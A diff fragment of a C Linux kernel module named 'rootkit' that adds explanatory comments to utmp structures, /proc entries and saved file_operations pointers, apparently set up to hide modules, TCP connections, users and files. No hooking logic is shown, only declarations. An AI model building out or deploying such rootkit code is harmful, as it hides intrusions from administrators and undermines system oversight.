@@ -5,7 +5,6 @@
 #include <linux/sched.h>
 #include <linux/proc_fs.h>
 #include <linux/version.h>
-#include <linux/delay.h>
 
 #define MODULE_NAME      "rootkit"
 #define MAX_COMMAND_SZ   30
@@ -36,11 +35,19 @@
 #define UT_NAMESIZE     32
 #define UT_HOSTSIZE     256
 
+
+/*
+* The exit_status data structure is used to hold information 
+* about the exit status of processes marked as DEAD_PROCESS in the user accounting database.
+*/
 struct exit_status {
   short int e_termination;    /* process termination status */
   short int e_exit;           /* process exit status */
 };
 
+/*
+* The utmp data structure is used to hold information about entries in the user accounting database.
+*/
 struct utmp {
   short ut_type;              /* type of login */
   pid_t ut_pid;               /* PID of login process */
@@ -61,13 +68,31 @@ struct utmp {
 };
 
 /* Injection structs */
+
+/*The VFS inode data structure holds information about a file or directory on disk.*/
 struct inode *pinode, *tinode, *uinode, *rcinode, *modinode;
+/* virtual file in the /proc filesystem*/
 struct proc_dir_entry *modules, *root, *handler, *tcp;
+
+/*
+* The file_operations structure is defined in linux/fs.h, and holds pointers to functions defined by the driver
+* that perform various operations on the device. Each field of the structure corresponds to the address of some 
+* function defined by the driver to handle a requested operation.
+*/
 static struct file_operations modules_fops, proc_fops, handler_fops, tcp_fops, user_fops, rc_fops, mod_fops;
 const struct file_operations *proc_original = 0, *modules_proc_original = 0, *handler_original = 0, *tcp_proc_original = 0, *user_proc_original = 0, *rc_proc_original = 0, *mod_proc_original;
+
 filldir_t proc_filldir, rc_filldir, mod_filldir;
 
 char *rc_name, *rc_dir, *mod_name, *mod_dir;
+
+/* 
+ * module_param(foo, int, 0000)
+ * The first param is the parameters name
+ * The second param is it's data type
+ * The final argument is the permissions bits, 
+ * for exposing parameters in sysfs (if non-zero) at a later stage.
+ */
 module_param(rc_name , charp, 0);
 module_param(rc_dir  , charp, 0);
 module_param(mod_name, charp, 0);
